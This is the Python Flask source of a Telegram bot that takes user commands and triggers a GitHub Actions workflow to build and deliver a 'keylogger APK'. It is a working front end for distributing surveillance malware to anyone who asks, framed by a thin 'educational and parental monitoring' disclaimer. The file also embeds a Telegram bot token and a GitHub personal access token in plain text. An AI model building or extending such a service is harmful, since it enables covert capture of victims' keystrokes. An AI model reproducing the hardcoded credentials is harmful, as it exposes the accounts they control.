import os
from flask import Flask, request
import requests
import logging

# Flask App
app = Flask(__name__)

# Logging for Debugging
logging.basicConfig(level=logging.DEBUG)
app.logger.setLevel(logging.DEBUG)

# Configuration Variables
BOT_TOKEN = "8178078713:AAGOSCn4KEuvXC64xXhDrZjwQZmIy33gfaI"  # Telegram Bot Token
REPO_OWNER = "N4V33NM"  # GitHub username
REPO_NAME = "newdynamicapk"  # GitHub repository name
GITHUB_TOKEN = "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"  # GitHub PAT

# Check if all required variables are set
if not BOT_TOKEN or not REPO_OWNER or not REPO_NAME or not GITHUB_TOKEN:
    raise ValueError("BOT_TOKEN, REPO_OWNER, REPO_NAME, or GITHUB_TOKEN are missing.")

@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def handle_message():
    """Handle incoming Telegram bot messages."""
    data = request.json
    app.logger.debug(f"Received data: {data}")
    
    chat_id = data.get('message', {}).get('chat', {}).get('id')
    command = data.get('message', {}).get('text')

    if not chat_id or not command:
        app.logger.error("Invalid data received.")
        return "Invalid data", 400

    if command == "/start":
        # Send Welcome Message with Disclaimer and Links
        welcome_message = (
            "Welcome to the keylogger APK Generator Bot! 🎉\n\n"
            "This bot was developed by cyber naveen "
            "Follow my [Instagram profile](https://www.instagram.com/cyber.naveen.info) for updates!\n\n"
            "📝 *Disclaimer*: This bot is intended for educational purposes and parental monitoring only. "
            "Please use responsibly.\n\n"
            "Use `/request_apk` to generate your APK with your unique session ID."
        )
        send_message(chat_id, welcome_message, parse_mode="Markdown")
    elif command == "/request_apk":
        # Trigger GitHub Action and Respond to User
        response = trigger_github_action(chat_id)
        if response and response.status_code == 204:
            send_message(chat_id, "Your APK is being generated. You will receive it shortly!")
        else:
            app.logger.error(f"Error triggering GitHub Action: {response.text if response else 'No response'}")
            send_message(chat_id, "Error generating your APK. Please try again later.")
    else:
        send_message(chat_id, "Unknown command. Use /start to see available commands.")
    return "OK"

def trigger_github_action(chat_id):
    """Trigger GitHub Actions Workflow."""
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/actions/workflows/build.yml/dispatches"
    payload = {
        "ref": "main",  # Target branch for the workflow
        "inputs": {"chat_id": str(chat_id)}  # Send chat_id as input
    }
    headers = {
        "Accept": "application/vnd.github.v3+json",
        "Authorization": f"Bearer {GITHUB_TOKEN}"  # Use the hardcoded GitHub PAT here
    }
    try:
        response = requests.post(url, json=payload, headers=headers)
        app.logger.debug(f"GitHub Action Trigger Response: {response.status_code}, {response.text}")
        return response
    except Exception as e:
        app.logger.error(f"Error triggering GitHub Action: {e}")
        return None

def send_message(chat_id, text, parse_mode=None):
    """Send a message back to the user via Telegram."""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        response = requests.post(url, data=payload)
        app.logger.debug(f"Telegram Response: {response.status_code}, {response.text}")
    except Exception as e:
        app.logger.error(f"Error sending Telegram message: {e}")

# Flask App Entry Point
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # Default to port 5000
    app.run(host="0.0.0.0", port=port)

